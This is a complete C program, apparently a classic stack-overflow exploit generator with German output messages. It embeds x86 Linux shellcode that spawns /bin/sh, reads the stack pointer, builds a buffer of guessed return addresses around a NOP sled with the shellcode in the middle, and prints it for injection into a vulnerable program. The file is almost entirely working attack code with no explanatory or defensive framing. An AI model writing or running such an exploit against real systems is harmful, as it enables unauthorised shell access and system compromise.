#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_OFFSET 		0
#define DEFAULT_BUFFER_GR	512
#define NOP			0x90

char shellcode[] =
	"\xeb\x1f"		/* jmp 0x1f		*/
	"\x5e"			/* popl %esi		*/
	"\x89\x76\x08"		/* movl %esi,0x8(%esi)	*/
	"\x31\xc0"		/* xorl %eax,%eax	*/
	"\x88\x46\x07"		/* movb %eax,0x7(%esi)	*/
	"\x89\x46\x0c"		/* movl %eax,0xc(%esi)	*/
	"\xb0\x0b"		/* movb $0xb,%al	*/
	"\x89\xf3"		/* movl %esi,%ebx	*/
	"\x8d\x4e\x08"		/* leal 0x8(%esi),%ecx	*/
	"\x8d\x56\x0c"		/* leal 0xc(%esi),%edx	*/
	"\xcd\x80"		/* int $0x80		*/
	"\x31\xdb"		/* xorl %ebx,%ebx	*/
	"\x89\xd8"		/* movl %ebx,%eax	*/
	"\x40"			/* inc %eax		*/
	"\xcd\x80"		/* int $0x80		*/
	"\xe8\xdc\xff\xff\xff"	/* call -0x24		*/
	"/bin/sh";		/* .string \"/bin/sh\"	*/

unsigned long
GetESP (void)
{
	__asm__("movl %esp,%eax");
}

int
main (int argc, char *argv[])
{
	char 	*buff, *zgr;
	long 	*adr_zgr, adr;
	int 	offset = DEFAULT_OFFSET, bgr = DEFAULT_BUFFER_GR;
	int 	i;

	if (argc > 1) bgr = atoi (argv[1]);
	if (argc > 2) offset = atoi (argv[2]);

	if (!(buff = malloc (bgr))) {
		printf ("Fehler bei der Speicherreservierung.\n");
		exit (1);
	}

	adr = GetESP() - offset;
	fprintf (stderr, "ESP : 0x%x\n", GetESP());
	fprintf (stderr, "ESP mit Offset: 0x%x\n", adr);

	zgr = buff;
	adr_zgr = (long *) zgr;
	for (i = 0; i < bgr; i+=4)
		*(adr_zgr++) = adr;

	for (i = 0; i < bgr/2; i++)
		buff[i] = NOP;

	zgr = buff + ((bgr/2) - (strlen (shellcode)/2));
	for (i = 0; i < strlen (shellcode); i++)
		*(zgr++) = shellcode[i];

	buff[bgr - 1] = '\0';

	printf ("%s", buff);

	return 0;
}
